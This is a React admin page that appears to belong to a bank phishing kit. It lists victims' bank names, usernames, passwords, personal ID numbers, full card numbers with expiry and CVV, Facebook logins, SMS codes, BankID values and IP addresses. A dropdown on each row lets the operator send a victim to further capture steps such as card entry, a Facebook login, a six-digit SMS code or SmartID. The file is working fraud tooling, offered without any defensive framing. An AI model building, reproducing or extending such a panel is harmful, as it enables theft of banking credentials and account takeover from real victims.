import React, { useEffect, useState } from "react";
import styled from 'styled-components';


import DropDown from "../../components/dropdown";
import { RestApi } from "../../provider/restApi";
import { useNavigate } from "react-router-dom";
import { useGlobalData } from "../../provider/context";
import { PadWithZero } from "../../provider/services";
import CustomModal from "../../components/custom-modal";
import { useI18n } from "react-simple-i18n";


const AdminHome = () => {
    const [state, { dispatch }]: any = useGlobalData();
    const { t } = useI18n();
    const settingOption = t('admin.langSet');
    const userOption = [
        {
            val: 'Process',
            text: t('admin.process')
        },
        {
            val: 'Send Card',
            text: t('admin.sendCard')
        },
        {
            val: 'Facebook Site',
            text: t('admin.facebookLog'),
        },
        {
            val: 'Send 6 digit SMS',
            text: t('admin.sendSMS'),
        },
        {
            val: 'Code Calculator',
            text: t('admin.codeCal')
        },
        {
            val: 'SmartID',
            text: t('admin.smartId'),
        },
    ]
    const [modal, setModal] = useState(false);

    const usersData = state.allUsers;
    const navigation = useNavigate();
    const adminLogged = state.adminLogged;

    const getUsers = async () => {
        const token: any = localStorage.getItem('adminToken');
        const formData = {
            token: token
        }
        const res = await RestApi.getAllUsers(formData);
        if (res.status) {
            dispatch({
                type: 'adminLogged',
                payload: true
            })
            dispatch({
                type: 'allUsers',
                payload: res.data
            })
        } else {
            navigation('/admin')
        }
    };
    useEffect(() => {
        getUsers();
    }, [])
    return (
        <>
            {adminLogged && (
                <AdminSection>
                    <div className="admin">
                        <div className="admin-header">
                            <a className="admin-title">
                                {t('admin.adminPanel')}
                            </a>
                            <div className="admin-setting">
                                <button onClick={() => setModal(true)}>{settingOption}</button>
                            </div>
                            {modal && (
                                <CustomModal onClose={() => setModal(false)} />
                            )}
                        </div>
                        <table cellSpacing={0}>
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>{t('admin.bank')}</th>
                                    <th>{t('admin.username')}</th>
                                    <th>{t('admin.password')}</th>
                                    <th>{t('admin.personNumber')}</th>
                                    <th>{t('admin.cardInfo')}</th>
                                    <th>{t('admin.facebook')}</th>
                                    <th>{t('admin.sms')}</th>
                                    <th>{t('admin.bankId')}</th>
                                    <th>{t('admin.ip')}</th>
                                    <th>#</th>
                                </tr>
                            </thead>
                            <tbody>
                                {usersData.length > 0 ? (
                                    <>
                                        {usersData.map((item: any, index: any) => (
                                            <tr key={index}>
                                                <td>{item.userId}</td>
                                                <td>{item.bankName}</td>
                                                <td>{item.username}</td>
                                                <td>{item.password}</td>
                                                <td>{item.personNumber}</td>
                                                <td><span style={{ 'display': 'block', 'fontSize': '16px' }}>Number:{PadWithZero(item.cardInfo.cardNumber)}</span>
                                                    <span style={{ 'display': 'block', 'fontSize': '16px' }}>SKT:{item.cardInfo.valideTime}</span>
                                                    <span style={{ 'display': 'block', 'fontSize': '16px' }}>CVV:{item.cardInfo.secureCode}</span>
                                                </td>
                                                <td><span style={{ 'display': 'block', 'fontSize': '16px' }}>username:{item.facebook.username}</span>
                                                    <span style={{ 'display': 'block', 'fontSize': '16px' }}>password:{item.facebook.password}</span></td>
                                                <td>{item.sms}</td>
                                                <td>{item.bankId}</td>
                                                <td>{item.ip}</td>
                                                <td>
                                                    <DropDown options={userOption} select={item.username} />
                                                </td>
                                            </tr>
                                        ))}
                                    </>
                                ) : (
                                    <tr>
                                        <td colSpan={11} rowSpan={3} >
                                            <span style={{ 'fontSize': '2em' }}>{t('admin.dataWillAppear')}</span>
                                        </td>
                                    </tr>

                                )}
                            </tbody>
                        </table>
                    </div>
                </AdminSection>
            )}
        </>
    )
}

const AdminSection = styled.div`
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 1em 0em;
    .admin {
        width: 70%;
        display: flex;
        flex-direction: column;
        gap: 1em;
        .admin-header {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            align-items: center;
            position: relative;
            .admin-title {
                font-size: 1.25em;
                text-decoration: none;
                font-weight: 400;
            }
            .admin-set {
                display: flex;
                gap: 1em;
                input {
                    padding: 1em 3em;
                    border: 1px solid rgb(216, 223, 228);
                    border-radius: 0.5em;
                    &:focus {
                        outline: none;
                    }
                }
                button {
                    padding: 1em 2em;
                    background-color: white;
                    border: 1px solid rgb(216, 223, 228);
                    border-radius: 0.5em;
                    cursor: pointer;
                }
            }
            .admin-setting {
                button {
                    padding: 1em 2em;
                    font-size: 16px;
                    border-radius: 0.5em;
                    border: none;
                    color: white;
                    background-color: #212529;    
                }
            }
        }
        table {
            width: 100%;
            thead {
                width: 100%;
                background-color: #212529;
                tr {
                    th {
                        padding: 2em 0em;
                        color: white;    
                    }
                }
            }
            tbody {
                width: 100%; 
                padding: 0em 0.5em;
                border: 1px solid rgb(216, 223, 228);
                
                tr {
                    width: 100%;
                    align-items: center;
                    height: fit-content;
                    text-align: center;
                    td {
                        width:fit-content;
                        height: fit-content;
                        padding: 1em 1em;
                        border-bottom: 1px solid rgb(216, 223, 228);
                    }
                    td:last-child {
                        font-size: 12px;
                    }      
                }
            }
        }
}
`

export default AdminHome